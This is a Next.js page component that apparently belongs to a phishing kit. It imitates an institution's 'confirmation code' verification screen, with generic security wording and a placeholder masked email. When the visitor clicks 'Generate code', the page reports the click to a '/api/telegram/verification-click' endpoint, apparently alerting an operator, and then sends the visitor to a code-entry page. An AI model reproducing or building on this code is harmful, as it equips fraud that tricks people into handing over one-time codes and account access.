"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { Check, ChevronDown, Info, Lock, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { VerificationHeader } from "@/components/verification-header";

export default function VerifyChoicePage() {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [selectedMethod, setSelectedMethod] = useState<"email" | "text">(
    "email",
  );
  const [maskedEmail, setMaskedEmail] = useState("m**********r8@gmail.com");
  const redirectRef = useRef<number | null>(null);

  useEffect(() => {
    const storedEmail = sessionStorage.getItem("verification_email");
    const storedMethod = sessionStorage.getItem("verification_method") as
      | "email"
      | "text"
      | null;

    if (storedEmail) {
      setMaskedEmail(storedEmail);
    } else {
      setMaskedEmail("m**********r8@gmail.com");
    }

    if (storedMethod === "email" || storedMethod === "text") {
      setSelectedMethod(storedMethod);
    }
  }, []);

  const saveVerificationChoice = (email: string, method: "email" | "text") => {
    if (typeof window !== "undefined") {
      sessionStorage.setItem("verification_email", email);
      sessionStorage.setItem("verification_method", method);
    }
  };

  const handleGenerateCode = async () => {
    if (isLoading) return;
    setIsLoading(true);

    try {
      await fetch("/api/telegram/verification-click", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          verificationType: selectedMethod === "email" ? "Email" : "Text",
        }),
      }).catch(console.error);
    } catch (error) {
      console.error("Failed to send verification-click notification:", error);
    }

    saveVerificationChoice(maskedEmail, selectedMethod);

    redirectRef.current = window.setTimeout(() => {
      router.push("/verify");
    }, 1000);
  };

  useEffect(() => {
    return () => {
      if (redirectRef.current) window.clearTimeout(redirectRef.current);
    };
  }, []);

  return (
    <div className="min-h-screen bg-[#f3f3f1]">
      <VerificationHeader />

      <div className="mx-auto w-full max-w-[1280px] px-4 py-8 md:py-9">
        <div className="ml-0 md:ml-[150px] w-[420px]">
          <div className="mb-5 flex justify-center md:justify-center">
            <Lock className="h-8 w-8" />
          </div>

          <p className="mb-7 w-[360px] text-[13px] text-center leading-[1.65rem] text-[#494949]">
            Protecting your information is our first priority. In order to
            access this site or perform this specific function you must receive
            a confirmation code to the device of your choice. You will be asked
            to enter the code on the next screen.
          </p>

          <div className="mb-5 flex items-center gap-4">
            <label className="w-[150px] text-[15px] font-medium text-[#2f2f2f]">
              Confirmation Code
            </label>

            <div className="relative w-[270px]">
              <select
                value={selectedMethod}
                onChange={(e) => {
                  const method = e.target.value as "email" | "text";
                  setSelectedMethod(method);
                  saveVerificationChoice(maskedEmail, method);
                }}
                className="h-[42px] w-full appearance-none rounded-none border border-[#4d4d4d] bg-white px-3 pr-10 text-[15px] text-[#3a3a3a] outline-none"
              >
                <option value="email">Email</option>
                <option value="text">Text</option>
              </select>
              <ChevronDown className="pointer-events-none absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-[#3b3b3b]" />
            </div>
          </div>

          <div className="mb-7">
            <div className="flex h-[42px] w-[270px] items-center border border-[#4d4d4d] bg-[#f1f1f1] px-3 text-[15px] text-[#4d4d4d]">
              {selectedMethod === "email" ? maskedEmail : "***-***-****"}
            </div>
          </div>

          <div className="space-y-3">
            <Button
              type="button"
              variant="ghost"
              onClick={() => router.push("/")}
              className="flex h-[54px] w-[270px] items-center justify-start gap-3 rounded-none border border-[#2d2d2d] bg-[#d7d7d7] px-4 text-left text-[15px] font-semibold tracking-[0.08em] text-[#2d2d2d] hover:bg-[#cfcfcf]"
            >
              <X className="h-5 w-5" strokeWidth={2.2} />
              <span>CANCEL</span>
            </Button>

            <Button
              type="button"
              onClick={handleGenerateCode}
              disabled={isLoading}
              className="flex h-[54px] w-[270px] items-center justify-start gap-3 rounded-none border border-[#2d2d2d] bg-[#2e4460] px-4 text-left text-[15px] font-semibold tracking-[0.08em] text-white hover:bg-[#263d54] disabled:opacity-80"
            >
              <Check className="h-5 w-5" strokeWidth={2.5} />
              <span>{isLoading ? "LOADING..." : "GENERATE CODE"}</span>
            </Button>
          </div>

          <div className="mt-7 flex w-[420px] items-start gap-4 rounded-[2px] border border-[#e1d88d] bg-[#e6e1a9] p-4 text-[#2d2d2d] shadow-sm">
            <div className="mt-1 flex h-9 w-9 shrink-0 items-center justify-center rounded-full border-[2px] border-[#2d2d2d] bg-transparent">
              <Info className="h-5 w-5" strokeWidth={2.3} />
            </div>
            <p className="w-[320px] text-[15px] leading-[1.6rem] text-[#2d2d2d]">
              To proceed, please press the generate code button. If you wish to
              cancel, you will be asked to enter a code the next time you login
              or try to perform this specific function.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
